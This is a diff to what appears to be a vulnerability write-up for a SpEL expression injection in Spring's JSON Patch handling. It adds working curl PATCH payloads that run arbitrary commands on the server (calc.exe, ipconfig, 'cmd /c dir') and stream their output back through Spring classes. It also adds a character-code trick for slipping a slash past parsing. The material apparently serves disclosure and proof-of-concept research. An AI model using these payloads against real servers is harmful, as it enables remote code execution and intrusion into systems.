@@ -35,10 +35,22 @@ Probably the simplest exploit is the following request.
 curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(java.lang.Thread).sleep(10000).x", "value" : "pwned" }]' "http://hostname:port/entity/1"
 ```
 
-On Windows, the calc.exe process can be launched with the following request. Similar requests can be used to launch arbitrary commands.
+On Windows, the `calc.exe` process can be launched with the following request. Similar requests can be used to launch arbitrary commands.
 
 ```
 curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(java.lang.Runtime).getRuntime().exec(\"calc.exe\").x", "value" : "pwned" }]' "http://hostname:port/entity/1/"
+```
+
+To obtain the output of launched commands, some "gadgets" offered by Spring Framework code can be used. Luckily, no external dependencies are required. For example, the result of `ipconfig` command can be retrieved with the following request.
+
+```
+T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"ipconfig\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x
+```
+
+On Windows, a `cmd /c dir` command, and other similar commands, can be launched with the following request. Please note the trick used to insert the slash char avoiding the explicit value (i.e. explicit slashes are replaced with dots befor the real parsing).
+
+```
+curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"cmd \" + T(java.lang.String).valueOf(T(java.lang.Character).toChars(0x2F)) + \"c dir\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x", "value" : "pwned" }]' "http://hostname:port/entity/1/"
 ```
 
 ## Authors
